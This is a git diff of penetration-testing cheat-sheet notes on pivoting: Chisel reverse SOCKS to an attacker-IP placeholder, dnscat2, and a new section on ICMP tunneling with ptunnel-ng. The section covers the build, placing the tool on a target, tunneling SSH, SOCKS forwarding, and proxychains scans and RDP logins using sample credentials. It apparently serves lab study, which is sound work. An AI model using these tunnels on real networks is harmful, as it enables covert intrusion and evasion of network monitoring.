@@ -37,5 +37,31 @@ dnscat2> window -i 1 # drop a shell
    ### Connecting the Chisel Client to our Attack Host
    ./chisel client -v <ATTACKER-IP>:1234 R:socks
 
-    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
+   proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
+```
+
+## ICMP Tunneling with SOCKS
+```bash
+# ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses, (https://github.com/utoni/ptunnel-ng.git)
+Attacker(10.129.x.x:)=ICMP(SSH)=> M1 (10.129.x.x:22)=SSH=> M1 (localhost:22)
+# setup tool with static binery
+sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+
+# local port frw
+  ## Starting the ptunnel-ng Server on the Target Host
+  scp -r ptunnel-ng <M1-USER>@<M1-IP>:~/
+  sudo ./ptunnel-ng -r<M1-IP> -R22
+
+  ## Connecting to ptunnel-ng Server from Attack Host
+  sudo ./ptunnel-ng -p<M1-IP> -l2222 -r<M1-ip> -R22
+
+  ## On The Attack host Tunneling an SSH connection through an ICMP Tunnel
+  ssh -p2222 -lubuntu 127.0.0.1
+
+# enable Dynamic Port frw over ssh
+  ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+  proxychains nmap -sV -sT 172.16.5.19 -p3389
 ```
